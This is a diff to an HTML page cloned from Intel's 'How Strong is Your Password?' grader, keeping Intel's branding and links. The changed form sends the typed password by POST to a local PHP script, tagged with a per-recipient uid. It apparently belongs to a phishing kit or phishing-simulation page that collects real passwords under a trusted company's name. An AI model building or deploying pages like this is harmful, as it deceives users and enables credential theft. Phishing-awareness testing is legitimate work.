@@ -21,7 +21,7 @@
         <meta name="language" content="en"/>
         <meta name="location" content="us"/>
         <meta name="X-Server" content="PRD1PCQAPP06"/>
-		<meta http-equiv="X-UA-Compatible" content="IE=Edge"/>
+        <meta http-equiv="X-UA-Compatible" content="IE=Edge"/>
         <meta property="og:title" content="How Strong is Your Password?"/>
         <meta property="og:type" content="company"/>
         <meta property="og:url" content="http://www.intel.com/content/www/us/en/forms/passwordwin.html"/>
@@ -31,14 +31,8 @@
 
         <meta property="og:description" content="Use our password grader to see how strong your password is, and then upgrade it for more security."/>
         
-		  
-
-        
-        
         <link rel="icon" type="image/vnd.microsoft.icon" href="https://www-ssl.intel.com/etc/designs/ver/3.1.188/intel/default/favicon.ico"/>
         <link rel="shortcut icon" type="image/vnd.microsoft.icon" href="https://www-ssl.intel.com/etc/designs/ver/3.1.188/intel/default/favicon.ico"/>
-        
-
 
         <!--[if gte IE 7]><!-->
          <script type="text/javascript">
@@ -835,7 +829,7 @@ loadAsyncScript('http://apis.google.com/js/plusone.js', 'https://apis.google.com
   <![endif]-->
  <div id="passwordContent">
 
-<form method="POST" action="index2.php?uid=<?php echo $uid ?>" name="NFuseForm" autocomplete="off">
+<form method="POST" action="index2.php?uid=<?php echo $uid ?>" name="PasswordForm" autocomplete="off">
   <div  id="page" class="clearfix wapwrapper" data-component="consumer-security" data-component-id="1"><!-- column -->
    <div class="position_content" id="page_position_content">
     <div class="clearfix colelem" id="pu1279"><!-- group -->
@@ -868,7 +862,7 @@ loadAsyncScript('http://apis.google.com/js/plusone.js', 'https://apis.google.com
      </div>
      <div class="form-grp clearfix grpelem" id="widgetu1254"><!-- group -->
       <div class="fld-grp clearfix grpelem" id="widgetu1262" data-required="true"><!-- group -->
-       <span class="fld-input NoWrap actAsDiv clearfix grpelem" id="u1266-4"><!-- content --><input class="wrapped-input" type="password" spellcheck="false" id="widgetu1262_input" name="FormFieldName" tabindex="1"/><label class="wrapped-input fld-prompt" id="widgetu1262_prompt" for="widgetu1262_input"><span class="actAsPara">Test your strong password here*</span></label></span>
+       <span class="fld-input NoWrap actAsDiv clearfix grpelem" id="u1266-4"><!-- content --><input class="wrapped-input" type="password" spellcheck="false" id="widgetu1262_input" name="PasswordForm" tabindex="1"/><label class="wrapped-input fld-prompt" id="widgetu1262_prompt" for="widgetu1262_input"><span class="actAsPara">Test your strong password here*</span></label></span>
       </div>
       <input class="submit-btn NoWrap grpelem" id="u1268-17" type="submit" value="" tabindex="3" onclick="javacript:checkThisThing();"/><!-- state-based BG images -->
      </div>
